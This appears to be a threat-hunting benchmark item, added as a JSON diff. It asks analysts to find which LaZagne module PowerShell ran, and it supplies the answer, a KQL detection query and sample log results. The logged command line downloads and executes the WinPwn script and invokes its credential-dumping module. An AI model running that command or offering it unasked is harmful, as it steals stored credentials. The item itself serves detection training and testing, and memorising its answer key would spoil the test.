@@ -1,0 +1,38 @@
+{
+    "technique_id": "T1555",
+    "question_id": "079ee2e9-6f16-47ca-a635-14efcd994118",
+    "context": "An adversary on a Windows host used PowerShell to retrieve and run a credential‐stealing tool from the internet.",
+    "objective": "Detect when LaZagne is invoked locally and identify the exact module name executed by PowerShell.",
+    "technical_details": {
+        "command_analysis": "PowerShell is observed executing a DownloadString call to pull a remote script, then invoking LaZagne via its module command.",
+        "detection_approach": "Search Windows process creation logs for PowerShell sessions that include both a downloadstring operation and the LaZagne module keyword in the command line."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Craft the question so the analyst targets process creation records, filters for suspicious PowerShell download‐and‐execute chains, and extracts the module name parameter.",
+    "prompt": "On a Windows endpoint, you find PowerShell reaching out to a remote URL and then running a module command. What was the LaZagne module name that was executed?",
+    "answer": [
+        "lazagnemodule"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "DeviceProcessEvents\n| where FileName in~('powershell.exe','pwsh.exe')\n| where ProcessCommandLine contains 'DownloadString'\n| where tolower(ProcessCommandLine) contains 'lazagnemodule'\n| extend ModuleName = extract(@\"(?i)(lazagnemodule)\", 1, ProcessCommandLine)\n| project TimeGenerated, DeviceName, AccountName, FileName, ProcessId, ProcessCommandLine, ModuleName\n| order by TimeGenerated desc",
+    "KQL_validation_message": "KQL query validation successful: The query results lists 'lazagnemodule' under the 'ModuleName' column for a process executed via PowerShell. The expected answer is 'lazagnemodule,' which is explicitly present in the results. Therefore, the returned data directly supports identifying the expected activity.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "AccountName",
+            "FileName",
+            "ProcessId",
+            "ProcessCommandLine",
+            "ModuleName"
+        ],
+        [
+            "2025-05-07 17:04:08.356314+00:00",
+            "windows-vm",
+            "wipro",
+            "powershell.exe",
+            9408,
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive}",
+            "lazagnemodule"
+        ]
+    ]
+}
